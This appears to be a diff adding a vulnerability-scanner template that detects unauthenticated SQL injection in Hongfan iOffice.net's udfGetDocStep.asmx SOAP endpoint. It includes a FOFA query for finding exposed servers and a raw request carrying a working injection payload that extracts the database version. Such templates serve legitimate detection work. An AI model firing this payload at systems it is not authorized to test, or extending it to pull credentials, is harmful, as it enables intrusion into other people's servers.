@@ -1,0 +1,42 @@
+id: hongfanioffice-udfGetDocStep-sqli
+
+info:
+  name: 红帆ioffice-udfGetDocStep存在SQL注入漏洞
+  author: candada
+  severity: high
+  description: '红帆iOffice.net udfGetDocStep.asmx接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。'
+  reference:
+    - https://blog.csdn.net/qq_36618918/article/details/136497474?spm=1001.2014.3001.5501
+  tags: 2024,红帆,sqli,红帆ioffice
+  metadata:
+    fofa-query: app="红帆-ioffice"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:   
+
+http:
+  - raw:
+      - "POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1\nHost: {{Hostname}}\n\
+        Content-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/GetDocStep\"\
+        \nContent-Length: 567\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope\
+        \ xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
+        \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n\
+        \    <GetDocStep xmlns=\"http://tempuri.org/\">\n        <docid>1'+(SELECT\
+        \ CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT\
+        \ (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</docid>\n\
+        \    </GetDocStep>\n    </soap:Body>\n</soap:Envelope>  \n\n"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL Server'
+      - type: status
+        status:
+          - 500
